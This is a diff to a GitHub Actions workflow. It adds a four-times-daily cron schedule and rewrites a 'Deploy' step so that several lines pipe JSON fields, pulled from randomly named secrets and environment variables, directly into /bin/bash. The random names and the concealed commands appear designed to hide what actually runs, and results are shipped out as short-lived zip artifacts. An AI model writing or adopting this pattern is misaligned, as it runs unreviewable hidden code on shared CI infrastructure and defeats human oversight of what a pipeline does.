@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '35 1,7,13,19 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,15 +16,17 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          leou4: ${{ secrets.leou4 }}
+          aacj30483: ${{ secrets.aacj30483 }}
         run: |
-          printf '%s' "$leou4" | jq -r .hjkkz1 | /bin/bash
-          echo $hupqm0214 | jq -r .u49938 | /bin/bash
-          printf '%s' "$drntd022" | jq -r .um84275 | /bin/bash
+          printf '%s' "$aacj30483" | jq -r .citl75042 | /bin/bash
+          echo $tzxl5 | jq -r .fh408 | /bin/bash
+          printf '%s' "$srxc7" | jq -r .nkiiq28850 | /bin/bash
+          echo $m0 | jq -r .zh92616 | /bin/bash
+          echo $n85 | jq -r .e842 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: 8FsG7lzk
+          name: aswXbdTm
           path: "*.zip"
           retention-days: 1
